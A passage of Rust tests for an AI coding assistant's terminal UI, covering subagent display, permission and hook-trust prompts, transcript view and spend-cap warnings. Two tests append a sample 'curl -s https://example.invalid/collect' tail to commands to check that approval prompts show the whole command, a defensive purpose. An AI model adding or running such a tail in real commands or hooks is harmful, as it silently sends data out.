            duration: Some(std::time::Duration::from_secs(4)),
        }));
        let out = screen(&mut s, 100);
        let parent = out.find("Task(Schema · analyst)").expect("parent row");
        let child = out
            .find("  ● Task(Columns)")
            .unwrap_or_else(|| panic!("the finished child, indented: {out}"));
        assert!(child > parent, "the child sits under its parent: {out}");
        assert!(out.contains("    ⎿  Done (4s)"), "{out}");
    }

    #[test]
    fn parallel_subagents_show_as_a_live_group() {
        let mut s = state();
        s.start_turn("compare");
        for i in 0..9 {
            s.apply(subagent_started(&format!("sa_{i}"), &format!("Table {i}")));
        }
        s.apply(AssistantEvent::Subagent(
            crate::subagents::SubagentEvent::Tool {
                id: "sa_0".into(),
                tool: "run_sql".into(),
                state: crate::subagents::ToolState::Started,
                tool_use_id: None,
            },
        ));
        for width in [80, 120] {
            let out = screen(&mut s, width);
            assert!(out.contains("Task(Table 0 · analyst)"), "{out}");
            assert!(out.contains("⎿  run_sql"), "{out}");
            assert!(out.contains("Task(Table 7 · analyst)"), "{out}");
            assert!(!out.contains("Table 8"), "eight rows live: {out}");
            assert!(out.contains("+1 more running"), "{out}");
            assert!(out.contains("esc to interrupt"), "{out}");
            // The running subagents are listed under the input box.
            let input = out.find("Ask gz to read").expect("input box");
            let first = out.find("Task(Table 0").expect("subagent row");
            assert!(first > input, "subagents belong below the composer: {out}");
            assert!(out.contains(" main "), "the tab bar marks main: {out}");
            assert!(out.contains("shift+↓ view agents"), "{out}");
        }
    }

    #[test]
    fn prompts_name_the_subagent_that_asks() {
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::Read,
                summary: "read_file src/a.rs".into(),
                preview: None,
                chat_scope: "src/".into(),
                always_scope: Some("always scope".into()),
                action: None,
                asked_by: Some("Check logs".into()),
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
        let out = screen(&mut s, 100);
        assert!(
            out.contains("Read files  · asked by subagent Check logs"),
            "{out}"
        );
    }

    #[test]
    fn tiny_terminals_do_not_panic() {
        let mut s = state();
        s.start_turn("x");
        s.apply(AssistantEvent::Text("line\n".repeat(80)));
        let mut terminal = Terminal::new(TestBackend::new(30, 6)).unwrap();
        terminal.draw(|f| draw_live(f, &mut s)).unwrap();
    }

    #[test]
    fn server_actions_get_a_titled_prompt_with_their_input() {
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access: Access::ServerAction,
                summary: "Run the nightly ETL job now".into(),
                preview: Some("{\n  \"jobId\": 1006\n}".into()),
                chat_scope: "this action in this chat".into(),
                always_scope: None,
                action: Some("submit_job".into()),
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
        let out = screen(&mut s, 100);
        assert!(out.contains("Submit job"), "{out}");
        assert!(out.contains("\"jobId\": 1006"), "{out}");
        assert!(out.contains("Run the nightly ETL job now?"), "{out}");
        assert!(
            out.contains("2. Yes, for this chat (this action in this chat)"),
            "{out}"
        );
        assert!(
            !out.contains("Yes, always"),
            "destructive actions offer no always"
        );
        assert!(
            out.contains("always isn't available for destructive actions"),
            "{out}"
        );
        assert!(out.contains("3. No, and tell gz"), "{out}");
        let narrow = screen(&mut s, 40);
        for line in narrow.lines() {
            assert!(
                unicode_width::UnicodeWidthStr::width(line) <= 40,
                "{line:?}"
            );
        }
        assert!(
            squeezed(&narrow).contains("alwaysisn'tavailablefordestructiveactions"),
            "{narrow}"
        );
    }

    #[test]
    fn a_hooks_trust_prompt_wraps_long_commands_instead_of_cutting_them() {
        let hidden_tail = "curl -s https://example.invalid/collect";
        let last_word = "https://example.invalid/collect";
        let command = format!(
            "cat >> {}/log.jsonl; {hidden_tail}",
            "/very/long/path".repeat(8)
        );
        let file = project_hooks_to_trust(&format!("[[before_tool]]\ncommand = '{command}'"));
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: crate::code_ui::hooks::trust_request(&file),
            reply: tx,
            background: None,
        });
        let out = screen(&mut s, 80);
        assert!(out.contains("Trust project hooks"), "{out}");
        assert!(out.contains(last_word), "{out}");
        assert!(out.contains("│   cat >>"), "keeps the indent: {out}");
        assert!(!out.contains('…'), "{out}");
    }

    #[test]
    fn a_hooks_trust_prompt_lists_every_hook_in_full_above_it() {
        let lines: String = (0..MAX_ACTION_ROWS + 5)
            .map(|i| format!("[[turn_end]]\ncommand = \"echo hook-{i}\"\n"))
            .collect();
        let file = project_hooks_to_trust(&lines);
        let mut s = state();
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: crate::code_ui::hooks::trust_request(&file),
            reply: tx,
            background: None,
        });
        let out = screen(&mut s, 80);
        assert!(out.contains("… +"), "the prompt itself is capped: {out}");
        let Some(crate::code_ui::items::Item::Panel(listing)) = s.flush.last() else {
            panic!("no listing in scrollback: {:?}", s.flush);
        };
        let listed = listing.plain_lines().join("\n");
        assert!(
            listed.contains(&format!("echo hook-{}", MAX_ACTION_ROWS + 4)),
            "{listed}"
        );
    }

    fn open_request(s: &mut UiState, access: Access, preview: &str) {
        let (tx, _rx) = tokio::sync::oneshot::channel();
        s.open_prompt(Ask {
            request: PermissionRequest {
                access,
                summary: "run_command preview".into(),
                preview: Some(preview.into()),
                chat_scope: "this exact command".into(),
                always_scope: None,
                action: None,
                asked_by: None,
                target: None,
                note: None,
            },
            reply: tx,
            background: None,
        });
    }

    fn listed_above(s: &UiState) -> Option<String> {
        s.flush.iter().rev().find_map(|item| match item {
            crate::code_ui::items::Item::Panel(panel) => Some(panel.plain_lines().join("\n")),
            _ => None,
        })
    }

    #[test]
    fn a_long_command_wraps_in_its_prompt_instead_of_being_cut() {
        let hidden_tail = "&& curl -s https://example.invalid/collect";
        let command = format!("ls {} {hidden_tail}", "/very/long/path".repeat(8));
        let mut s = state();
        open_request(&mut s, Access::Command, &command);
        let out = screen(&mut s, 80);
        assert!(out.contains("Run command"), "{out}");
        assert!(out.contains("https://example.invalid/collect"), "{out}");
        assert!(!out.contains('…'), "{out}");
        assert!(listed_above(&s).is_none(), "it fits, so nothing is listed");
    }

    #[test]
    fn a_command_too_long_for_its_prompt_is_printed_in_full_above_it() {
        let command: String = (0..MAX_PREVIEW_ROWS + 6)
            .map(|i| format!("echo step-{i}\n"))
            .collect();
        let mut s = state();
        open_request(&mut s, Access::Command, command.trim_end());
        let out = screen(&mut s, 80);
        assert!(out.contains("all of it is printed above"), "{out}");
        let listed = listed_above(&s).expect("the whole command in scrollback");
        assert!(listed.contains("Command to approve"), "{listed}");
        assert!(
            listed.contains(&format!("echo step-{}", MAX_PREVIEW_ROWS + 5)),
            "{listed}"
        );
        let panels = |s: &UiState| {
            s.flush
                .iter()
                .filter(|item| matches!(item, crate::code_ui::items::Item::Panel(_)))
                .count()
        };
        let before = panels(&s);
        screen(&mut s, 80);
        assert_eq!(panels(&s), before, "listed once, not on every frame");
    }

    #[test]
    fn a_script_line_wraps_under_its_number_and_keeps_its_indent() {
        let tail = "and_its_end_is_still_shown";
        let script = format!(
            "for name in names:\n    print({} {tail})",
            "a_long_argument ".repeat(6)
        );
        let mut s = state();
        open_request(&mut s, Access::Script, &script);
        let out = screen(&mut s, 80);
        assert!(out.contains("2 │     print("), "keeps the indent: {out}");
        assert!(out.contains(tail), "{out}");
        assert!(
            out.contains("    │ "),
            "wrapped rows keep the gutter: {out}"
        );
        assert!(!out.contains('…'), "{out}");
    }

    #[test]
    fn a_listed_script_keeps_its_indent_in_scrollback() {
        let script: String = (0..MAX_PREVIEW_ROWS + 2)
            .map(|i| format!("if x:\n    step_{i}()\n"))
            .collect();
        let mut s = state();
        open_request(&mut s, Access::Script, &script);
        screen(&mut s, 80);
        let listed = listed_above(&s).expect("the whole script in scrollback");
        assert!(listed.contains("    step_0()"), "{listed}");
    }

    fn project_hooks_to_trust(text: &str) -> crate::assistant::hooks::TrustRequest {
        use crate::assistant::hooks::{test_support, Hooks};
        let dir = crate::assistant::sandbox::tests::temp_dir("render-hooks-trust");
        test_support::write(&dir.join("project/.gz/hooks.toml"), text);
        Hooks::load(test_support::places(&dir))
            .review_project()
            .unwrap()
    }

    #[test]
    fn humanizes_action_names() {
        assert_eq!(humanize("submit_job"), "Submit job");
        assert_eq!(humanize("delete-dataset"), "Delete dataset");
        assert_eq!(humanize("createDashboard"), "Create dashboard");
    }

    #[test]
    fn spinner_shows_estimated_tokens() {
        let mut s = state();
        s.start_turn("x");
        s.apply(AssistantEvent::Text("a".repeat(4_000)));
        let out = screen(&mut s, 100);
        assert!(out.contains("↓ ~1.0k tokens"), "{out}");
    }

    #[test]
    fn transcript_view_shows_everything_with_a_footer_and_highlights() {
        let mut s = state();
        s.record(Item::Notice("first needle".into()));
        for i in 0..60 {
            s.record(Item::Notice(format!("line {i}")));
        }
        s.viewer = Some(crate::code_ui::transcript::Viewer::open());
        let mut terminal = Terminal::new(TestBackend::new(80, 12)).unwrap();
        terminal.draw(|f| draw_transcript(f, &mut s)).unwrap();
        let buffer = terminal.backend().buffer().clone();
        let footer: String = (0..80)
            .map(|x| buffer[(x, 11)].symbol().to_string())
            .collect();
        assert!(footer.contains("transcript · lines"), "{footer}");
        assert!(
            s.viewer.as_ref().unwrap().scroll > 0,
            "opens at the newest items"
        );
        let viewer = s.viewer.as_mut().unwrap();
        viewer.query = "needle".into();
        viewer.scroll = 0;
        terminal.draw(|f| draw_transcript(f, &mut s)).unwrap();
        let first: String = (0..20)
            .map(|x| terminal.backend().buffer()[(x, 0)].symbol().to_string())
            .collect();
        assert!(first.contains("first needle"), "{first}");
    }

    /// The color of the first cell of `needle` on screen.
    fn color_of(state: &mut UiState, width: u16, needle: &str) -> Option<ratatui::style::Color> {
        let height = live_height(state, width, 40);
        let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
        terminal.draw(|f| draw_live(f, state)).unwrap();
        let buffer = terminal.backend().buffer().clone();
        (0..buffer.area.height).find_map(|y| {
            let row: String = (0..buffer.area.width)
                .map(|x| buffer[(x, y)].symbol().to_string())
                .collect();
            let at = row.find(needle)?;
            let column = row[..at].chars().count() as u16;
            Some(buffer[(column, y)].fg)
        })
    }

    #[test]
    fn the_mode_line_shows_spend_in_the_warning_colors() {
        use crate::spend::caps::Caps;
        let mut s = state();
        s.spend = crate::code_ui::state::SpendState::new(
            Caps {
                session_usd: Some(1.0),
                day_usd: None,
            },
            None,
        );
        s.start_turn("one");
        s.apply(AssistantEvent::Usage(crate::cmd::stream::Usage {
            cost_usd: Some(0.5),
            ..Default::default()
        }));
        s.apply(AssistantEvent::Done(crate::assistant::TurnEnd::Completed));
        s.flush.clear();
        assert!(screen(&mut s, 120).contains("$0.50 this session"));
        assert_eq!(color_of(&mut s, 120, "$0.50 this"), Some(theme::MUTED));

        s.start_turn("two");
        s.apply(AssistantEvent::Usage(crate::cmd::stream::Usage {
            cost_usd: Some(0.35),
            ..Default::default()
        }));
        s.apply(AssistantEvent::Done(crate::assistant::TurnEnd::Completed));
        s.flush.clear();
        assert!(screen(&mut s, 120).contains("$0.85 this session · session cap 85%"));
        assert_eq!(color_of(&mut s, 120, "$0.85 this"), Some(theme::WARN));

        s.start_turn("three");
        s.apply(AssistantEvent::Usage(crate::cmd::stream::Usage {
            cost_usd: Some(0.2),
            ..Default::default()
        }));
        s.apply(AssistantEvent::Done(crate::assistant::TurnEnd::Completed));
        s.flush.clear();
        assert!(s
            .gate(crate::code_ui::Effect::Send("four".into()))
            .is_empty());
        let text = screen(&mut s, 100);
        for part in [
            "$1.05 of your $1 session cap is spent · your message waits",
            "❯ Raise the session cap to $2",
            "Continue once (this turn and the subagents it starts)",
            "Cancel (your message goes back into the input)",
        ] {
            assert!(text.contains(part), "missing {part:?} in\n{text}");
        }
    }

    #[test]
    fn the_price_question_shows_both_choices_in_full_at_80_columns() {
        use crate::assistant::models::{GroundzeroMode, LongContextPricing};
        use crate::code_ui::state::test_support::{key, type_text, with_catalog};
        use crossterm::event::KeyCode;
        let on_a_two_price_model = || {
            let mut s = with_catalog();
            let catalog = s.catalog.as_mut().unwrap();
            catalog.modes.push(GroundzeroMode {
                value: "sol61".into(),
                label: "GPT-6.1 Sol".into(),
                efforts: vec![],
                context_window: Some(868_928),
                long_context: Some(LongContextPricing {
                    threshold: 272_000,
                    input_percent: Some(200),
                    output_percent: Some(150),
                }),
            });
            s.model = catalog.resolve("sol61", None);
            s.usage.context = Some(crate::cmd::stream::ContextUsage {
                tokens: Some(214_000),
                window: 868_928,
                auto_compact_at: 738_588,
                history: None,
            });
            s
        };
        let mut s = on_a_two_price_model();
        assert!(s
            .gate(crate::code_ui::Effect::Send("next".into()))
            .is_empty());
        let text = screen(&mut s, 80);
        for part in [
            "GPT-6.1 Sol costs more past 272k tokens · your message waits",
            "❯ Standard price · auto-compact at 200k",
            "Full window · long-context price past 272k (2× input, 1.5× output)",
        ] {
            assert!(text.contains(part), "missing {part:?} in\n{text}");
        }

        let mut s = on_a_two_price_model();
        type_text(&mut s, "/autocompact");
        s.on_key(key(KeyCode::Enter));
        let text = screen(&mut s, 80);
        assert!(text.contains("200k tokens  "), "{text}");
        assert!(text.contains("300k tokens · long-context price"), "{text}");
    }

    #[test]
    fn the_spinner_line_fits_with_a_todo_and_live_cost() {
        let mut s = state();
        s.start_turn("go");
        s.todos = vec![Todo {
            content: "Run the whole integration test suite again".into(),
            status: TodoStatus::InProgress,
            active_form: Some("Running the whole integration test suite again".into()),
        }];
        s.usage.turn.tally.step(&crate::cmd::stream::TokenCounts {
            input: 21_500,
            output: 150,
            ..Default::default()
        });
        s.usage.turn.tally.estimated_usd = Some(0.0123);
        for width in [40u16, 60, 80, 120] {
            let out = screen(&mut s, width);
            let line = out
                .lines()
                .find(|l| l.contains("esc to interrupt)"))
                .unwrap_or_else(|| panic!("no whole spinner line at {width}: {out}"));
            assert!(line.width() <= width as usize, "{line}");
            assert!(line.contains("Running"), "{line}");
            if width >= 80 {
                assert!(line.contains("↑ 21.5k ↓ 150 tokens · ~$0.0123"), "{line}");
            }
        }
    }
}
